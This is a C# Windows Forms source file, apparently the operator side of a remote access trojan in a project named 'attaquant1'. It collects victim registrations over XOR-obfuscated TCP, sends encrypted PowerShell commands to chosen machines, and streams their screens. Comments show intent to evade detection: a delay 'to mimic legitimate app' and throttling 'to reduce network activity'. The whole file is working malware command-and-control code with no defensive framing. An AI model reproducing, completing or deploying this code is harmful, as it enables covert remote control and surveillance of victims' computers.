using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace attaquant1
{
    public partial class Form1 : Form
    {
        private TcpListener server;
        private bool isRunning = false;
        private readonly byte xorKey = 0x5A;
        private readonly List<ClientInfo> clients = new List<ClientInfo>();
        private readonly Dictionary<string, TcpClient> activeConnections = new Dictionary<string, TcpClient>();
        private bool isRemoteDesktopRunning = false;
        private TcpClient remoteDesktopClient;

        public Form1()
        {
            InitializeComponent();
            if (Environment.MachineName.Length > 0) // Dummy check to mimic legitimate app
            {
                Task.Delay(3000).Wait(); // 3-second delay at startup
            }
        }

        private async void StartServerButton_Click(object sender, EventArgs e)
        {
            if (!isRunning)
            {
                try
                {
                    server = new TcpListener(IPAddress.Any, 8080);
                    server.Start();
                    isRunning = true;
                    StartServerButton.Text = "Stop Server";
                    ServerStatusLabel.Text = "Server running on 127.0.0.1:8080";
                    LogTextBox.AppendText("Server started...\r\n");

                    await Task.Run(() => ListenForClients());
                }
                catch (Exception ex)
                {
                    LogTextBox.AppendText($"Error: {ex.Message}\r\n");
                }
            }
            else
            {
                StopServer();
            }
        }

        private async void ListenForClients()
        {
            while (isRunning)
            {
                try
                {
                    TcpClient client = await server.AcceptTcpClientAsync();
                    Invoke(new Action(() => LogTextBox.AppendText("Client connected!\r\n")));
                    _ = Task.Run(() => HandleClient(client));
                }
                catch (Exception ex)
                {
                    if (isRunning)
                    {
                        Invoke(new Action(() => LogTextBox.AppendText($"Accept error: {ex.Message}\r\n")));
                    }
                }
                await Task.Delay(500); // 500ms delay to reduce network activity
            }
        }

        private async Task HandleClient(TcpClient client)
        {
            string clientId = null;
            try
            {
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] buffer = new byte[2048];
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);

                    string encrypted = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    string decrypted = Decrypt(encrypted, xorKey);

                    string[] parts = decrypted.Split('|');
                    if (parts.Length == 4)
                    {
                        clientId = parts[0];
                        string formatted = $"{parts[0]},{parts[1]},{parts[2]},{parts[3]},AV_OK";

                        lock (clients)
                        {
                            if (!clients.Exists(c => c.ClientId == clientId))
                            {
                                clients.Add(new ClientInfo
                                {
                                    ClientId = parts[0],
                                    PCName = parts[1],
                                    LanIP = parts[2],
                                    Time = parts[3],
                                    AV = "AV_OK",
                                    Client = client
                                });
                                activeConnections[clientId] = client;
                            }
                        }

                        // Corrected Invoke block to ensure proper parentheses
                        Invoke(new Action(() =>
                        {
                            LogTextBox.AppendText($"Decrypted: {decrypted}\r\n");
                            UpdateClientGrid();
                        }));
                    }
                }
            }
            catch (Exception ex)
            {
                Invoke(new Action(() => LogTextBox.AppendText($"Client error: {ex.Message}\r\n")));
            }
            finally
            {
                if (clientId != null)
                {
                    lock (activeConnections)
                    {
                        activeConnections.Remove(clientId);
                    }
                }
            }
        }

        private string Decrypt(string base64, byte key)
        {
            try
            {
                byte[] bytes = Convert.FromBase64String(base64);
                for (int i = 0; i < bytes.Length; i++)
                    bytes[i] ^= key;
                return Encoding.UTF8.GetString(bytes);
            }
            catch
            {
                return "[Invalid format]";
            }
        }

        private void UpdateClientGrid()
        {
            ClientDataGridView.Rows.Clear();
            lock (clients)
            {
                foreach (var client in clients)
                {
                    ClientDataGridView.Rows.Add(client.ClientId, client.PCName, client.LanIP, client.Time, client.AV);
                }
            }
        }

        private async void PSSendButton_Click(object sender, EventArgs e)
        {
            if (ClientDataGridView.SelectedRows.Count > 0)
            {
                string clientIp = ClientDataGridView.SelectedRows[0].Cells[2].Value?.ToString();
                string command = PSTerminalInput.Text.Trim();

                if (string.IsNullOrEmpty(command)) return;

                PSTerminalOutput.AppendText($"> {command}\r\n");

                string result = await SendPowerShellCommand(clientIp, command);
                PSTerminalOutput.AppendText($"{result}\r\n");

                PSTerminalInput.Clear();
            }
            else
            {
                PSTerminalOutput.AppendText("No client selected for command execution.\r\n");
            }
        }

        private async void StartRemoteDesktopButton_Click(object sender, EventArgs e)
        {
            if (ClientDataGridView.SelectedRows.Count > 0)
            {
                string clientIp = ClientDataGridView.SelectedRows[0].Cells[2].Value?.ToString();
                LogTextBox.AppendText($"Starting remote desktop for {clientIp}\r\n");

                if (!isRemoteDesktopRunning)
                {
                    try
                    {
                        remoteDesktopClient = new TcpClient();
                        await remoteDesktopClient.ConnectAsync(clientIp, 8082);
                        isRemoteDesktopRunning = true;
                        StartRemoteDesktopButton.Text = "Stop Remote Desktop";
                        LogTextBox.AppendText("Remote desktop session started.\r\n");

                        await Task.Run(() => HandleRemoteDesktop(remoteDesktopClient));
                    }
                    catch (Exception ex)
                    {
                        LogTextBox.AppendText($"Remote desktop error: {ex.Message}\r\n");
                        StopRemoteDesktop();
                    }
                }
                else
                {
                    StopRemoteDesktop();
                }
            }
            else
            {
                LogTextBox.AppendText("No client selected for remote desktop.\r\n");
            }
        }

        private async Task HandleRemoteDesktop(TcpClient client)
        {
            try
            {
                using (NetworkStream stream = client.GetStream())
                {
                    while (isRemoteDesktopRunning)
                    {
                        // Send request for screenshot
                        byte[] request = Encoding.UTF8.GetBytes("SCREENSHOT");
                        await stream.WriteAsync(request, 0, request.Length);

                        // Read image size
                        byte[] sizeBuffer = new byte[4];
                        int bytesRead = await stream.ReadAsync(sizeBuffer, 0, sizeBuffer.Length);
                        if (bytesRead != 4)
                        {
                            throw new Exception("Failed to read image size");
                        }

                        int imageSize = BitConverter.ToInt32(sizeBuffer, 0);
                        if (imageSize <= 0) continue;

                        // Read image data
                        byte[] imageBuffer = new byte[imageSize];
                        int totalRead = 0;
                        while (totalRead < imageSize)
                        {
                            bytesRead = await stream.ReadAsync(imageBuffer, totalRead, imageSize - totalRead);
                            if (bytesRead == 0) throw new Exception("Connection closed");
                            totalRead += bytesRead;
                        }

                        // Display image
                        try
                        {
                            using (MemoryStream ms = new MemoryStream(imageBuffer))
                            {
                                Image newImage = Image.FromStream(ms);
                                // Corrected Invoke block to ensure proper parentheses
                                Invoke(new Action(() =>
                                {
                                    if (RemoteDesktopPictureBox.Image != null)
                                    {
                                        RemoteDesktopPictureBox.Image.Dispose();
                                        RemoteDesktopPictureBox.Image = null;
                                    }
                                    RemoteDesktopPictureBox.Image = newImage;
                                    RemoteDesktopPictureBox.Refresh();
                                }));
                            }
                        }
                        catch (Exception ex)
                        {
                            Invoke(new Action(() => LogTextBox.AppendText($"Image processing error: {ex.Message}\r\n")));
                        }

                        await Task.Delay(2000); // 2-second delay to reduce network activity
                    }
                }
            }
            catch (Exception ex)
            {
                Invoke(new Action(() => LogTextBox.AppendText($"Remote desktop error: {ex.Message}\r\n")));
            }
            finally
            {
                StopRemoteDesktop();
            }
        }

        private void StopRemoteDesktop()
        {
            isRemoteDesktopRunning = false;
            remoteDesktopClient?.Close();
            remoteDesktopClient = null;
            StartRemoteDesktopButton.Text = "Start Remote Desktop";
            LogTextBox.AppendText("Remote desktop session stopped.\r\n");
            Invoke(new Action(() =>
            {
                if (RemoteDesktopPictureBox.Image != null)
                {
                    RemoteDesktopPictureBox.Image.Dispose();
                    RemoteDesktopPictureBox.Image = null;
                }
                RemoteDesktopPictureBox.Refresh();
            }));
        }

        private async Task<string> SendPowerShellCommand(string clientIp, string command)
        {
            try
            {
                string encryptedCommand = Encrypt(command, xorKey);
                using (TcpClient psClient = new TcpClient())
                {
                    await psClient.ConnectAsync(clientIp, 8081);
                    using (NetworkStream stream = psClient.GetStream())
                    {
                        byte[] data = Encoding.UTF8.GetBytes(encryptedCommand);
                        await stream.WriteAsync(data, 0, data.Length);

                        byte[] buffer = new byte[4096];
                        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                        string response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                        return Decrypt(response, xorKey);
                    }
                }
            }
            catch (Exception ex)
            {
                return $"[ERROR] {ex.Message}";
            }
        }

        private string Encrypt(string input, byte key)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(input);
            for (int i = 0; i < bytes.Length; i++)
                bytes[i] ^= key;
            return Convert.ToBase64String(bytes);
        }

        private void StopServer()
        {
            isRunning = false;
            server?.Stop();
            lock (activeConnections)
            {
                foreach (var client in activeConnections.Values)
                    client.Close();
                activeConnections.Clear();
            }
            StopRemoteDesktop();
            StartServerButton.Text = "Start Server";
            ServerStatusLabel.Text = "Server stopped"; // Fixed from previous error
            LogTextBox.AppendText("Server stopped.\r\n");
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            StopServer();
            base.OnFormClosing(e);
        }
    }

    public class ClientInfo
    {
        public string ClientId { get; set; }
        public string PCName { get; set; }
        public string LanIP { get; set; }
        public string Time { get; set; }
        public string AV { get; set; }
        public TcpClient Client { get; set; }
    }
}